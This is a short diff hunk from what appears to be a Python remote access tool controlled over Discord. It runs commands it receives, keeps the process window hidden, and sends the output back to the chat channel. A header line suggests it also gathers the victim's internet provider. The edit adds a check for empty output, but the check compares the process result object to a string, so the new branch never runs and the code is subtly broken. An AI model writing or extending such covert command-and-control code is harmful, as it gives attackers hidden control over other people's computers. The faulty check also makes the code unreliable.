@@ -692,7 +692,11 @@ Internet Provider: {org}
                     finalCommand.extend(command[1:])
 
                     result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")
-                    embed = discord.Embed(description=f"Command executed successfully :\n```{result.stdout.strip()}```", color=discord.Color.purple())
+                    if result != "":
+                        embed = discord.Embed(description=f"Command executed successfully :\n```{result.stdout.strip()}```", color=discord.Color.purple())
+                    else:
+                        embed = discord.Embed(description=f"Command executed successfully", color=discord.Color.purple())
+                        
                     await message.channel.send(embed=embed)
                 except Exception as e:
                     embed = discord.Embed(description=f":no_entry: Unexpected error : `{e}`", color=discord.Color.red())
